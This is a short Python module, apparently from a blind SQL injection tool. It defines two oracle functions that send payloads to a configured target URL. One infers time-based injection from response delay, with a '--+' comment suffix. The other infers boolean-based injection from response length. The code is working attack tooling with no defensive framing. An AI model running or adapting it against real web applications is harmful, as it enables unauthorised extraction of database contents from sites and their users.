import time
import requests
from config import url, sleep_inject_sleep_time, boolean_inject_success_return_value, boolean_inject_failure_return_value

def sleep_inject_check_fn(payload):
  time1 = time.time()
  requests.get(url=url+payload+'--+')
  time2 = time.time()
  return time2 - time1 >= sleep_inject_sleep_time



def boolean_inject_check_fn(payload):
  res = requests.get(url=url+payload)
  # print(url+payload)
  # res = requests.post(url=url, data='id=' + payload, headers=headers)
  if len(res.content) != boolean_inject_success_return_value and len(res.content) != boolean_inject_failure_return_value:
    # print(url + payload)
    # print(boolean_inject_success_return_value)
    # print(boolean_inject_failure_return_value)
    # print(len(res.content))
    # TODO: check
    pass

  # print(res.text)
  # print(len(res.text))
  return len(res.content)
